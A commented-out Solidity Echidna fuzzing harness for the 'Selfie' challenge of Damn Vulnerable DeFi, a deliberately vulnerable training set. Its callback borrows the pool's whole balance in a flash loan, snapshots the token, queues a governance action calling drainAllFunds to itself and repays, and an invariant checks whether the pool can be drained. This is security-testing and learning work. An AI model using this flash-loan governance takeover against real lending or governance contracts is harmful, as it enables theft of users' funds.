// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.7;

// import "../SelfiePool.sol";
// import "../SimpleGovernance.sol";
// import "../../DamnValuableTokenSnapshot.sol";

// /**
//  * @notice to run echidna use following command:
//  * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfie --config ./contracts/selfie/echidna/config.yaml
//  */

// contract SelfieDeployment {
//     uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
//     uint256 TOKENS_IN_POOL = 1_500_000 ether;

//     function deployContracts()
//         external
//         returns (
//             SelfiePool,
//             SimpleGovernance,
//             DamnValuableTokenSnapshot
//         )
//     {
//         // deploy contracts
//         DamnValuableTokenSnapshot token;
//         token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

//         SimpleGovernance governance;
//         governance = new SimpleGovernance(address(token));

//         SelfiePool pool;
//         pool = new SelfiePool(address(token), address(governance));
//         // fund selfie pool
//         token.transfer(address(pool), TOKENS_IN_POOL);

//         return (pool, governance, token);
//     }
// }

// contract EchidnaSelfieBackups {
//     uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
//     uint256 TOKENS_IN_POOL = 1_500_000 ether;
//     uint256 private borrowAmount;

//     bool queueActionEnabled;
//     bool executeActionEnabled;
//     bool drainAllFundsEnabled;
//     bool transferEnabled;
//     bool snapshotEnabled;
//     bool actionExecuted = false;

//     uint256 weiAmount;
//     uint256 actionId;
//     uint256 lastSnapshot;
//     uint256 transferAmount;

//     SelfiePool pool;
//     SimpleGovernance governance;
//     DamnValuableTokenSnapshot token;

//     constructor() payable {
//         SelfieDeployment deployer;
//         deployer = new SelfieDeployment();
//         (pool, governance, token) = deployer.deployContracts();
//     }

//     function flashLoan() public {
//         borrowAmount = token.balanceOf(address(pool));
//         pool.flashLoan(borrowAmount);
//     }

//     function receiveTokens(address, uint256 _amount) external {
//         require(
//             msg.sender == address(pool),
//             "Only pool can call this function."
//         );
//         // logic
//         // callbackFunctions();
//         lastSnapshot = token.snapshot();
//         // create payload
//         bytes memory payload = abi.encodeWithSignature(
//             "drainAllFunds(address)",
//             address(this)
//         );
//         // queue action
//         // actionId = governance.queueAction(address(this), payload, weiAmount);
//         actionId = governance.queueAction(address(this), payload, 0);
//         // repay the loan
//         require(token.transfer(address(pool), _amount), "flash loan failed");
//     }

//     // function callbackFunctions() internal {
//     //     // if (snapshotEnabled) {
//     //     //     takeSnapshot();
//     //     // // }
//     //     if (queueActionEnabled) {
//     //     //     queueAction();
//     //     // // }
//     //     // if (executeActionEnabled) {
//     //     //     executeAction();
//     //     }
//     //     // if (drainAllFundsEnabled) {
//     //     //     drainAllFunds();
//     //     // }
//     //     // if (transferEnabled) {
//     //     //     transferFrom();
//     //     // }
//     // }

//     // function queueAction() public {
//     //     require(actionExecuted, "The last action has not been executed yet.");
//     //     // takeSnaphost
//     //     lastSnapshot = token.snapshot();
//     //     // create payload
//     //     bytes memory payload = abi.encodeWithSignature(
//     //         "drainAllFunds(address)",
//     //         address(this)
//     //     );
//     //     // queue action
//     //     // actionId = governance.queueAction(address(this), payload, weiAmount);
//     //     actionId = governance.queueAction(address(this), payload, 0);
//     //     actionExecuted = false;
//     // }

//     function executeAction() public {
//         require(
//             block.timestamp >= lastSnapshot + ACTION_DELAY_IN_SECONDS,
//             "Time for action execution has not passed yet"
//         );
//         governance.executeAction(actionId);
//         // actionExecuted = true;
//     }

//     // function drainAllFunds() public {
//     //     pool.drainAllFunds(address(this));
//     // }

//     // function transferFrom() public {
//     //     token.transferFrom(address(pool), address(this), transferAmount);
//     // }

//     // function takeSnapshot() public {
//     //     lastSnapshot = token.snapshot();
//     // }

//     // function setQueueActionEnabled(bool _enabled) external {
//     //     queueActionEnabled = _enabled;
//     //     // weiAmount = _weiAmount;
//     //     // weiAmount = 0;
//     // }

//     // function setExecuteActionEnabled(bool _enabled) external {
//     //     executeActionEnabled = _enabled;
//     // }

//     // function setDrainAllFundsEnabled(bool _enabled) external {
//     //     drainAllFundsEnabled = _enabled;
//     // }

//     // function setTransferEnabled(bool _enabled, uint256 _transferAmount)
//     //     external
//     // {
//     //     transferEnabled = _enabled;
//     //     transferAmount = _transferAmount;
//     // }

//     ////////////////
//     // INVARIANTS //
//     ////////////////
//     // GENERAL: Can we drain SelfiPool?
//     function checkPoolBalance() external view {
//         assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
//     }

//     // function checkThisContractBalance() external view {
//     //     assert(token.balanceOf(address(this)) == 0);
//     // }
// }
